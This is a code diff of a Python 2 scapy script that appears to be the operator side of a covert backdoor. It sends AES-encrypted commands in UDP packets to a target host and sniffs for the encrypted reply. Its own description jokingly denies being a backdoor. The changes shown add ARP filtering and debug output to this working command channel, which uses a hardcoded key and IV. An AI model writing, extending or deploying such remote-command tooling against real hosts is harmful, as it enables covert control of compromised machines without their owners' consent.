@@ -1,12 +1,14 @@
 from scapy.all import *
 import argparse
 from Crypto.Cipher import AES
-import time
 
 def packetFunc(packet):
-  encryptedData = packet['Raw'].load
-  data = decryptionObject.decrypt(encryptedData)
-  print data
+  # scapy is garbage and get's arp packet even though we're filtering
+  if ARP not in packet:
+    print "Got a packet"
+    encryptedData = packet['Raw'].load
+    data = decryptionObject.decrypt(encryptedData)
+    print data
 
 
 parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
@@ -34,5 +36,4 @@ decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
 encryptedCommand = encryptionObject.encrypt(command)
 packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
 send(packet)
-time.sleep(0.1)
 sniff(filter=sniffFilter,prn=packetFunc, count=1)
